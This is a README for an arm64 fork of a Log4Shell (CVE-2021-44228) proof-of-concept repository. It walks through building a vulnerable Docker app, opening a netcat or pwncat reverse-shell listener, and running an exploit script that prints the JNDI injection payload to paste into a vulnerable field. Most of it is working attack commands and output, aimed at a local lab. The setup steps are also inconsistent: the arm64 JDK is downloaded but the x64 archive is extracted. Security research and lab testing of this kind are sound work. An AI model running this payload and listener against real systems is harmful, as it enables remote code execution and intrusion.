# log4j-shell-poc-arm64v8
This is a fork optimized for arm64/v8 systems from [log4j-shell-poc](https://github.com/teimichael/log4j-shell-poc), a Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

## Workflow
### Set Java Environment
- Download `jdk-8u60-linux-arm64-vfp-hflt.tar.gz` from [Oracle archives](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
- Run
```
tar -xf jdk-8u60-linux-x64.tar.gz
```

### Set Python Environment
```
pip install -r requirements.txt
```

### Build Vulnerable App
```c
docker build -t log4j-shell-poc .
```

### Run Vulnerable App
```c
docker run --network host --name poc log4j-shell-poc
```

### Exploit Vulnerable App

* Start a netcat listener to accept reverse shell connection.
```py
nc -lvnp 9001
```

Or start [pwncat](https://github.com/calebstewart/pwncat)
```py
python3 -m pwncat -lp 9001 -m linux
```

* Launch the exploit.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

Disclaimer
-
This repository is not intended to be a one-click exploit to CVE-2021-44228.
